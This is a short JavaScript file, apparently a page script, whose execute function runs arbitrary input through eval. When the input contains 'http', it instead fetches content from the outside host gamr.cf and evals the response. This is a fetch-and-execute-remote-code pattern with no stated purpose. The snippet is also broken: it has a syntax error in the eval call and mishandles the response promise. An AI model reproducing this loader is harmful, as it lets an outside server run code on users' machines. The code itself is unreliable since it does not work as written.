window.addEventListener('DOMContentLoaded', () => {

})

function execute(code) {
    if (code.includes('http')) {
        fetch("https://gamr.cf/", {
                "method": "GET",
                "headers": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
            })
            .then(function(response) {
                console.log(response.status);
                return eval(response.text();)
            }).then(function(data) {
                console.log(data);
            })

    } else {
                eval(code);
    }
}
